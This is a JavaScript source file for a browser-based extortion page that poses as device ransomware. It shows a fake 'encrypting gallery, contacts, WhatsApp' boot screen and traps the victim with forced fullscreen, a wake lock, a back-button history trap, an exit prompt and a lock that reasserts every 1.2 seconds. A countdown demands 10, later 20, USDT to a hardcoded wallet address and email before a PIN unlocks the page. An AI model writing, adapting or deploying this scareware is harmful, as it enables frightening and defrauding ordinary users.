/* ================= CONFIG ================= */
const CONFIG = {
  address: "TEpUFeVXKJdFHqjZccqAU2zVQLgTvAzvtu",
  email:   "carolinawood2530@gmail.com",
  amount:  10,
  amountLate: 20,
  deadlineHours: 24,
  maxTries: 3,
  cooldown: 45,
  key: "vlock_v2"
};
const PIN_HASH = "ad57559";
const hash = s => { let h = 5381; for (const c of s) h = ((h * 33) + c.charCodeAt(0)) >>> 0; return h.toString(16); };

/* ================= ELEMENT REFS ================= */
const $ = id => document.getElementById(id);
const lockEl = $("lock"), doneEl = $("done"), content = $("content"),
      boot = $("boot"), barfill = $("barfill"), bootpct = $("bootpct"),
      bootline = $("bootline"), pinEl = $("pin"), form = $("form"),
      goEl = $("go"), msg = $("msg"), clockEl = $("clock");

/* ================= STORAGE (triple redundancy) ================= */
function read() {
  let s = {};
  try { s = JSON.parse(localStorage.getItem(CONFIG.key)) || {}; } catch {}
  try { const m = document.cookie.match(/vlk=([^;]+)/); if (m) s = Object.assign(JSON.parse(decodeURIComponent(m[1])), s); } catch {}
  try { const t = sessionStorage.getItem(CONFIG.key); if (t) s = Object.assign(JSON.parse(t), s); } catch {}
  return s;
}
function write(s) {
  const raw = JSON.stringify(s);
  try { localStorage.setItem(CONFIG.key, raw); } catch {}
  try { sessionStorage.setItem(CONFIG.key, raw); } catch {}
  try { document.cookie = "vlk=" + encodeURIComponent(raw) + ";path=/;max-age=31536000;SameSite=Lax"; } catch {}
}

let state = read();
if (!state.firstSeen) { state.firstSeen = Date.now(); write(state); }
let locked = !state.unlocked;

$("did").textContent = "TRX-" + hash(String(state.firstSeen)).toUpperCase().padEnd(6, "0");

/* ================= BOOT SEQUENCE (fail-safe) ================= */
const LINES = [
  "scanning /storage/emulated/0 …",
  "mounting display controller …",
  "locking /data/media …",
  "encrypting gallery · 2,431 items",
  "encrypting contacts · 604 entries",
  "encrypting /sdcard/WhatsApp …",
  "sealing key in volatile memory …",
  "hook installed in boot layer ✓"
];
let bootDone = false;
function reveal() {
  if (bootDone) return;
  bootDone = true;
  try { boot.classList.add("hidden"); content.classList.remove("hidden"); } catch {}
  beep(160, 0.16);
}
function runBoot() {
  try {
    let p = 0, i = 0;
    const tick = setInterval(() => {
      p = Math.min(100, p + Math.random() * 13 + 5);
      barfill.style.width = p + "%";
      bootpct.textContent = Math.floor(p) + "%";
      if (p > i * 12.5 && i < LINES.length) bootline.textContent = LINES[i++];
      if (p >= 100) { clearInterval(tick); setTimeout(reveal, 300); }
    }, 170);
  } catch { reveal(); }
  setTimeout(reveal, 6000); // hard fallback
}

/* ================= AUDIO ================= */
let ac;
function beep(freq, dur, type = "square") {
  try {
    ac = ac || new (window.AudioContext || window.webkitAudioContext)();
    const o = ac.createOscillator(), g = ac.createGain();
    o.type = type; o.frequency.value = freq; g.gain.value = 0.05;
    o.connect(g); g.connect(ac.destination);
    o.start(); o.stop(ac.currentTime + dur);
  } catch {}
}

/* ================= FULLSCREEN + WAKE LOCK ================= */
function goFull() {
  try {
    const d = document.documentElement;
    if (!document.fullscreenElement && d.requestFullscreen) {
      const r = d.requestFullscreen({ navigationUI: "hide" });
      if (r && r.catch) r.catch(() => {});
    }
    if (!document.webkitFullscreenElement && d.webkitRequestFullscreen) d.webkitRequestFullscreen();
  } catch {}
}
function keepAwake() {
  try {
    if ("wakeLock" in navigator && !wakeLock) {
      navigator.wakeLock.request("screen").then(w => {
        wakeLock = w;
        w.addEventListener("release", () => { wakeLock = null; });
      }).catch(() => {});
    }
  } catch {}
}
let wakeLock = null;

/* ================= RE-ASSERT THE LOCK (the important bit) ================= */
function reassert() {
  if (!locked) return;
  try {
    document.body.classList.add("locked");
    lockEl.classList.remove("hidden");
    doneEl.classList.add("hidden");
    lockEl.style.display = "";
  } catch {}
  goFull();
  keepAwake();
}

if (locked) {
  runBoot();
  document.addEventListener("pointerdown", () => { goFull(); keepAwake(); }, { passive: true });
  document.addEventListener("visibilitychange", () => { if (!document.hidden) reassert(); });
  document.addEventListener("focus", reassert);
  document.addEventListener("resize", reassert);
  document.addEventListener("orientationchange", () => setTimeout(reassert, 250));
  window.addEventListener("pageshow", e => { if (e.persisted || !state.unlocked) reassert(); });
  window.addEventListener("pagehide", () => {});
  document.addEventListener("contextmenu", e => e.preventDefault());

  /* back-button prison, double trap */
  try {
    history.pushState({ lock: 1 }, "", location.href);
    window.addEventListener("popstate", () => {
      if (!locked) return;
      history.pushState({ lock: 1 }, "", location.href);
      reassert();
    });
  } catch {}

  window.addEventListener("beforeunload", e => {
    if (!locked) return;
    e.preventDefault(); e.returnValue = "Device is encrypted. Reopen the link or the lock stays.";
  });

  /* watchdog: every 1.2s force the lock back on top */
  setInterval(reassert, 1200);
}

/* ================= OPERA MINI WARNING ================= */
if (/Opera Mini/i.test(navigator.userAgent)) $("mini").classList.remove("hidden");

/* ================= INSTALL PROMPT (PWA) ================= */
let deferredPrompt = null;
window.addEventListener("beforeinstallprompt", e => {
  e.preventDefault(); deferredPrompt = e;
  $("installbar").classList.remove("hidden");
});
$("installbtn")?.addEventListener("click", async () => {
  if (!deferredPrompt) return;
  deferredPrompt.prompt();
  await deferredPrompt.userChoice;
  deferredPrompt = null;
  $("installbar").classList.add("hidden");
});

/* ================= COUNTDOWN ================= */
function tickClock() {
  const end = state.firstSeen + CONFIG.deadlineHours * 3600e3;
  const s = Math.max(0, Math.floor((end - Date.now()) / 1000));
  clockEl.textContent = [Math.floor(s / 3600), Math.floor(s / 60) % 60, s % 60]
    .map(n => String(n).padStart(2, "0")).join(":");
  if (s === 0 && !state.late) {
    state.late = true; write(state);
    $("amt").textContent = CONFIG.amountLate;
    $("late").classList.remove("hidden");
    $("mail").href = `mailto:${CONFIG.email}?subject=UNLOCK%20PIN%20REQUEST%20-%20${CONFIG.amountLate}%20USDT%20SENT`;
  }
}
if (state.late) { $("amt").textContent = CONFIG.amountLate; $("late").classList.remove("hidden"); }
if (locked) { tickClock(); setInterval(tickClock, 1000); }

/* ================= COPY ================= */
$("copy").addEventListener("click", async () => {
  const btn = $("copy");
  try { await navigator.clipboard.writeText(CONFIG.address); }
  catch {
    try {
      const r = document.createRange(); r.selectNodeContents($("addr"));
      const sel = getSelection(); sel.removeAllRanges(); sel.addRange(r);
      document.execCommand && document.execCommand("copy");
    } catch {}
  }
  btn.textContent = "COPIED"; beep(880, 0.06, "sine");
  setTimeout(() => (btn.textContent = "COPY"), 1400);
});

/* ================= PIN ================= */
let cooling = 0;
form.addEventListener("submit", e => {
  e.preventDefault();
  if (cooling) return;
  const v = pinEl.value.replace(/\D/g, "");
  if (v.length < 4) return fail("Enter the full PIN");

  if (hash(v) === PIN_HASH) {
    state.unlocked = true; state.unlockedAt = Date.now(); write(state);
    locked = false;
    beep(1046, 0.1, "sine"); setTimeout(() => beep(1568, 0.16, "sine"), 110);
    lockEl.classList.add("hidden");
    doneEl.classList.remove("hidden");
    document.body.classList.remove("locked");
    try { if (document.fullscreenElement) document.exitFullscreen(); } catch {}
    try { if (wakeLock) { wakeLock.release(); wakeLock = null; } } catch {}
    return;
  }

  state.tries = (state.tries || 0) + 1;
  if (state.tries >= CONFIG.maxTries) { state.tries = 0; write(state); startCooldown(); fail(`Too many attempts — wait ${CONFIG.cooldown}s`); }
  else { write(state); fail(`Wrong PIN · ${CONFIG.maxTries - state.tries} attempt(s) left`); }
});

function fail(text) {
  msg.textContent = text; pinEl.value = "";
  pinEl.classList.remove("shake"); void pinEl.offsetWidth; pinEl.classList.add("shake");
  beep(150, 0.16); setTimeout(() => beep(110, 0.22), 130);
}
function startCooldown() {
  cooling = CONFIG.cooldown; goEl.disabled = true;
  goEl.textContent = `LOCKED · ${cooling}s`;
  const iv = setInterval(() => {
    cooling--;
    if (cooling <= 0) { clearInterval(iv); goEl.disabled = false; goEl.textContent = "UNLOCK DEVICE"; msg.textContent = ""; return; }
    goEl.textContent = `LOCKED · ${cooling}s`;
  }, 1000);
}

/* ================= RELOCK ================= */
function relock() { state.unlocked = false; write(state); location.reload(); }
$("relock").addEventListener("click", relock);
$("again").addEventListener("click", relock);

/* ================= SERVICE WORKER ================= */
if ("serviceWorker" in navigator) {
  window.addEventListener("load", () => navigator.serviceWorker.register("sw.js").catch(() => {}));
  }
